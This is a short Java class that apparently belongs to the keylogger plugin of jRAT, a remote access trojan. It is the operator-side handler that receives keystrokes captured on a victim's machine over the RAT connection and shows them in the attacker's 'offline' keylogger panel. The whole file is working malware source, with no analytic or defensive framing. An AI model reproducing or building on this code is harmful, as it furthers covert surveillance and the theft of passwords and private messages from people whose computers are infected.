package se.jrat.plugin.keylogger.client;

import se.jrat.plugin.keylogger.client.ui.PanelKeylogger;
import jrat.api.Client;
import jrat.api.net.PacketListener;

public class PacketLog extends PacketListener {

	@Override
	public void perform(Client client) {
		try {
			PanelKeylogger panel = (PanelKeylogger) KeyloggerPlugin.entry.getInstances().get(client);

			if (panel != null) {
				panel.offlineTextPane.setText("");
			}

			while (client.getDataInputStream().readBoolean()) {
				int length;
				if ((length = client.getDataInputStream().readInt()) != -1) {
					StringBuilder builder = new StringBuilder();
					for (int i = 0; i < length; i++) {
						builder.append(client.getDataInputStream().readChar());
					}

					if (panel != null) {
						panel.appendOffline(builder.toString());
					}
				} else {
					if (panel != null) {
						panel.appendOffline(client.getDataInputStream().readUTF());
					}
				}
			}
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

}